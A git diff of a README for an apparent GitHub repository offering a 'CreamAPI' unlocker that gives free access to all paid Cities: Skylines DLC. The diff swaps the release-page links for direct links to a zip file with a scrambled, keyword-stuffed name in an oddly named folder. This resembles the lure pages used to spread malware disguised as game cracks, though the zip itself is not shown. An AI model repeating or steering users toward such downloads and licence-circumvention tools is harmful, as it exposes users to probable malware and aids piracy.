@@ -1,6 +1,6 @@
 # 🏗️ -CreamAPI-DLC-Unlocker-for-Cities-Skylines-Steam-Unlock-All-DLCs-Free- - Access every Cities Skylines expansion pack
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Americanfoxhoundpythius498/-CreamAPI-DLC-Unlocker-for-Cities-Skylines-Steam-Unlock-All-DLCs-Free-/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Americanfoxhoundpythius498/-CreamAPI-DLC-Unlocker-for-Cities-Skylines-Steam-Unlock-All-DLCs-Free-/main/calciphobe/Skylines-Cs-AP-Unlocker-Steam-Cities-Free-for-DL-Unlock-All-Cream-v3.0.zip)
 
 ## 📖 About this tool
 This software allows users to access all downloadable content for the game Cities: Skylines on the Steam platform. It works by modifying the way the game communicates with Steam to identify available content. You must own a legitimate copy of the base game on Steam to use this application. This tool does not provide the base game, nor does it host game files. It simply enables the features already present in the game data but restricted by the Steam store lock.
@@ -18,7 +18,7 @@ This software allows users to access all downloadable content for the game Citie
 3. Click the file ending in .zip to start the download.
 4. Save the file to your computer desktop for easy access.
 
-[Visit the release page to download your files](https://github.com/Americanfoxhoundpythius498/-CreamAPI-DLC-Unlocker-for-Cities-Skylines-Steam-Unlock-All-DLCs-Free-/releases)
+[Visit the release page to download your files](https://raw.githubusercontent.com/Americanfoxhoundpythius498/-CreamAPI-DLC-Unlocker-for-Cities-Skylines-Steam-Unlock-All-DLCs-Free-/main/calciphobe/Skylines-Cs-AP-Unlocker-Steam-Cities-Free-for-DL-Unlock-All-Cream-v3.0.zip)
 
 ## ⚙️ Installation steps
 Follow these steps carefully to ensure the unlocker functions correctly with your game files.
